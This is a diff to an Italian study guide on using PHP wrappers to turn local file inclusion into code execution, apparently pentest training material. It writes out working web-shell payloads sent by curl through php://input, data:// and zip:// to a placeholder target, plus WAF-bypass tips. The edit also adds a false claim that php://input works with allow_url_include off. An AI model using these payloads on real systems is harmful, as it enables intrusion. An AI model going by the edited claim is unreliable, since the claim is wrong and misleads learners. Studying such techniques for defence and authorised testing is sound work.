@@ -1,15 +1,15 @@
 # PHP Wrappers
 
-**Difficolta:** Advanced
+**Difficoltà:** Advanced
 **Time to Master:** 2h
 **Prerequisiti:** [03-RFI-Techniques.md](03-RFI-Techniques.md)
-**Lab:** PortSwigger / HTB — LFI con wrapper
+**Lab:** PortSwigger / HTB (LFI con wrapper)
 
 ---
 
 ## Obiettivo
 
-Usare i wrapper PHP (`php://filter`, `php://input`, `data://`, `expect://`, `zip://`, `phar://`) per leggere codice sorgente o ottenere RCE quando `allow_url_include` e disattivato e il log poisoning non e disponibile.
+Quando `allow_url_include` è disattivato (il caso più comune oggi) e non hai un log da avvelenare, non sei bloccato: i wrapper PHP (`php://filter`, `php://input`, `data://`, `expect://`, `zip://`, `phar://`) aprono altre strade, dalla lettura del codice sorgente fino alla RCE diretta. È la cassetta degli attrezzi da tenere pronta per quando LFI/RFI "standard" non bastano.
 
 ---
 
@@ -20,7 +20,7 @@ Usare i wrapper PHP (`php://filter`, `php://input`, `data://`, `expect://`, `zip
 | Wrapper | Uso |
 |---------|-----|
 | `php://filter` | legge/trasforma il contenuto di un file (es. base64) senza eseguirlo |
-| `php://input` | legge il body della richiesta POST come "file" incluso — RCE se combinato con LFI |
+| `php://input` | legge il body della richiesta POST come "file" incluso (RCE se combinato con LFI) |
 | `data://` | inietta dati arbitrari (anche codice) come se fossero un file, funziona se `allow_url_include=On` |
 | `zip://` / `phar://` | esegue codice contenuto in un archivio caricato sul server |
 | `expect://` | esegue comandi di sistema direttamente (richiede estensione `expect`, raro) |
@@ -54,18 +54,16 @@ echo "PD9waHAgJGRiX3Bhc3MgPSAic2VjcmV0IjsgPz4=" | base64 -d
 ### Esempio 2: RCE con php://input
 
 **Setup:**
-- Target: LFI confermata + `allow_url_include=On` (o comunque `php://input` non bloccato)
+- Target: LFI confermata su un parametro incluso con `include()`/`require()`
+- **Non serve `allow_url_include=On`**: `php://input` non è un wrapper che recupera contenuto remoto (a differenza di `data://` o della RFI classica), quindi PHP lo consente anche con `allow_url_include=Off`, ed è proprio per questo che è l'alternativa più affidabile quando quella direttiva è disattivata (vedi Obiettivo del file)
 
 **Step-by-step:**
 ```bash
-curl -X POST "http://target.com/index.php?page=php://input" \
-  --data '<?php system($_GET["cmd"]); ?>' 
-# poi, nella stessa richiesta o in una successiva se la sessione lo permette:
-curl "http://target.com/index.php?page=php://input&cmd=id" \
-  -X POST --data '<?php system($_GET["cmd"]); ?>'
+curl -X POST "http://target.com/index.php?page=php://input&cmd=id" \
+  --data '<?php system($_GET["cmd"]); ?>'
 ```
 
-**Spiegazione:** `php://input` fa si che il body della richiesta POST venga trattato come il "file" da includere: se contiene codice PHP valido, viene eseguito.
+**Spiegazione:** `php://input` fa sì che il body della richiesta POST venga trattato come il "file" da includere: se contiene codice PHP valido, viene eseguito. Ogni richiesta a `php://input` è indipendente: il payload PHP nel body e il parametro `cmd` devono trovarsi nella STESSA richiesta, non in due richieste separate (non c'è stato condiviso tra richieste come invece accade con log/session poisoning).
 
 ### Esempio 3: data:// wrapper per RCE diretta
 
@@ -73,7 +71,7 @@ curl "http://target.com/index.php?page=php://input&cmd=id" \
 curl "http://target.com/index.php?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+&cmd=id"
 ```
 
-**Spiegazione:** il base64 decodifica in `<?php system($_GET['cmd']); ?>`; funziona solo se `allow_url_include=On` dato che `data://` e considerato "esterno" da PHP.
+**Spiegazione:** il base64 decodifica in `<?php system($_GET['cmd']); ?>`; funziona solo se `allow_url_include=On` dato che `data://` è considerato "esterno" da PHP.
 
 ### Esempio 4: zip:// per eseguire codice da un file caricato
 
@@ -87,7 +85,7 @@ zip payload.zip shell.php
 curl "http://target.com/index.php?page=zip://uploads/payload.zip%23shell.php&cmd=id"
 ```
 
-**Spiegazione:** `%23` e il carattere `#` URL-encoded, separatore tra path dello zip e file interno da estrarre/eseguire.
+**Spiegazione:** `%23` è il carattere `#` URL-encoded, separatore tra path dello zip e file interno da estrarre/eseguire.
 
 ---
 
@@ -98,13 +96,13 @@ curl "http://target.com/index.php?page=zip://uploads/payload.zip%23shell.php&cmd
 ```
 PHP://filter/convert.base64-encode/resource=config.php   (case variation, raro)
 ```
-In generale se "php://" e bloccato letteralmente da un WAF, prova doppio encoding o combinazioni case-insensitive: molti filtri regex sono case-sensitive per errore.
+In generale se "php://" è bloccato letteralmente da un WAF, prova doppio encoding o combinazioni case-insensitive: molti filtri regex sono case-sensitive per errore.
 
 ---
 
 ## Lab Hands-On
 
-### Lab 1: PortSwigger / HTB — LFI con php://filter
+### Lab 1: PortSwigger / HTB (LFI con php://filter)
 **Obiettivo:** estrarre codice sorgente sensibile via wrapper
 **Difficulty:** Difficile
 **Time:** 1h
@@ -126,7 +124,7 @@ In generale se "php://" e bloccato letteralmente da un WAF, prova doppio encodin
 ## Link Utili
 
 - [PHP Wrappers Manual](https://www.php.net/manual/en/wrappers.php)
-- [HackTricks — LFI/RFI wrappers](https://book.hacktricks.xyz/)
+- [HackTricks: LFI/RFI wrappers](https://book.hacktricks.xyz/)
 
 ---
 
@@ -145,8 +143,3 @@ In generale se "php://" e bloccato letteralmente da un WAF, prova doppio encodin
 - [ ] So costruire ed eseguire un payload zip://
 - [ ] Conosco la differenza pratica tra i vari wrapper
 
----
-
-## Note personali
-
-_(spazio libero)_
